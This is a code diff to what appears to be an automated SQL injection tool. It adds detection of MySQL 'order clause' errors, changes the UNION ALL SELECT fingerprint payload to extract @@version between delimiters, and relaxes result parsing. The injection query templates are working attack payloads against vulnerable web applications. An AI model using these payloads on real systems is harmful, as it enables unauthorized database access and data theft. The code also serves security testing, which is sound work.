@@ -25,6 +25,9 @@
 import re
 
 class DbmsMole():
+    error_strings = [
+                        "Error: Unknown column '(\d*)' in 'order clause'"
+                    ]
     
     @classmethod
     def dbms_check_query(cls, columns, injectable_field):
@@ -53,6 +56,13 @@ class DbmsMole():
     @classmethod
     def dbms_name(cls):
         return ''
+    
+    @classmethod
+    def is_error(cls, data):
+        for i in DbmsMole.error_strings:
+            if re.match(i, data):
+                return True
+        return False
 
 class Mysql5Mole(DbmsMole):
 
@@ -90,7 +100,7 @@ class Mysql5Mole(DbmsMole):
     def dbms_check_query(cls, columns, injectable_field):
         query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
         query_list = list(map(str, range(columns)))
-        query_list[injectable_field] = "@@version"
+        query_list[injectable_field] = "CONCAT({fing},@@version,{fing})".format(fing=Mysql5Mole.out_delimiter)
         query += ",".join(query_list) + " {com}"
         return query
     
@@ -176,7 +186,7 @@ class Mysql5Mole(DbmsMole):
     @classmethod
     def parse_results(cls, url_data):
         data_list = url_data.split(Mysql5Mole.out_delimiter_result)
-        if len(data_list) != 3:
+        if len(data_list) < 3:
             return None
         data = data_list[1]
         return data.split(Mysql5Mole.inner_delimiter_result)
